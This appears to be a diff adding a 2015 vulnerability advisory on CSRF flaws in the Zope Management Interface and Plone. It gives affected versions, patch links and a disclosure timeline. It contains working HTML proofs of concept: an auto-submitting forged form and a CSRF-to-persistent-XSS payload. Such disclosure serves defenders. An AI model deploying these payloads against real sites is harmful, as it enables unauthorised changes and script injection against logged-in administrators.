@@ -1,0 +1,157 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-ZOPE-CSRF.txt
+
+
+Vendor:
+================================
+www.zope.org
+plone.org
+
+
+Product:
+================================
+Zope Management Interface 4.3.7
+
+Zope is a Python-based application server for building secure and highly
+scalable web applications.
+Plone Is a Content Management System built on top of the open source
+application server Zope
+and the accompanying Content Management Framework.
+
+
+Vulnerability Type:
+===================
+Cross site request forgery (CSRF)
+
+Multiple CSRF (cross-site request forgery) vulnerabilities in the ZMI (Zope
+Management Interface).
+Patches to Zope and Plone for multiple CSRF issues.
+
+https://plone.org/security/20151006/multiple-csrf-vulnerabilities-in-zope
+https://plone.org/products/plone/security/advisories/security-vulnerability-20151006-csrf
+
+
+CVE Reference:
+==============
+NA
+
+
+Vulnerability Details:
+=====================
+
+Security vulnerability: 20151006 - CSRF
+ZMI is mostly unprotected from CSRF vulnerabilities.
+
+Versions affected
+
+4.3.7, 4.3.6, 4.3.5, 4.3.4, 4.3.3, 4.3.2, 4.3.1, 4.3, 4.2.7, 4.2.6, 4.2.5,
+4.2.4, 4.2.3, 4.2.2, 4.2.1, 4.2
+4.1.6, 4.1.5, 4.1.4, 4.1.3, 4.1.2, 4.1.1, 4.1, 4.0.9, 4.0.7, 4.0.5, 4.0.4,
+4.0.3, 4.0.2, 4.0.1, 4.0, 3.3.6
+3.3.5, 3.3.4. 3.3.3, 3.3.2, 3.3.1, 3.3
+
+All versions of Plone prior to 5.x are vulnerable.
+
+
+Fixed by
+Nathan Van Gheem, of the Plone Security Team
+Coordinated by Plone Security Team
+
+patch was released and is available from
+https://pypi.python.org/pypi/plone4.csrffixes
+
+
+Exploit code(s):
+===============
+
+<!DOCTYPE>
+<html>
+<head>
+<title>Plone CSRF Add Linxs & Persistent XSS</title>
+
+<body onLoad="doit()">
+
+<script>
+function doit(){
+var e=document.getElementById('HELL')
+e.submit()
+}
+</script>
+
+ <form id="HELL" method="post"  action="
+http://localhost:8080/Plone/Members/portal_factory/Link/link.2015-08-30.6666666666/atct_edit
+">
+          <input type="text" name="title" id="title" value="HYP3RLINX"
+size="30" maxlength="255" placeholder="" />
+          <input type="text" name="remoteUrl"  id="remoteUrl" value="
+http://hyp3rlinx.altervista.org" size="30" maxlength="511" placeholder="" />
+     <input type="hidden" name="fieldset" value="default" />
+          <input type="hidden" name="form.submitted" value="1" />
+</form>
+
+
+2) CSRF to Persistent XSS -  Zope Management Interface
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Persistent XSS via CSRF on title change properties tab, this will execute
+on each Zope page accessed by users.
+
+CSRF to Persistent XSS POC Code:
+=================================
+
+<form id="HELL" action="http://localhost:8080/" method="post">
+<input type="text" name="title:UTF-8:string" size="35"
+value="</title><script>alert('XSS by hyp3rlinx 08302015')</script>" />
+ <input name="manage_editProperties:method"  value="Save Changes" />
+</form>
+
+
+Disclosure Timeline:
+=========================================================
+Vulnerability reported: 2015-08-30
+Hotfix released: 2015-10-06
+
+
+Exploitation Technique:
+=======================
+Remote
+Vector        NETWORK
+Complexity LOW
+Authentication NONE
+Confidentiality NONE
+Integrity PARTIAL
+Availability PARTIAL
+
+
+Severity Level:
+=========================================================
+6.4 – MEDIUM
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+]  POST
+
+
+Vulnerable Product:             [+]  Zope Management Interface & all
+versions of Plone prior to 5.x are vulnerable.
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
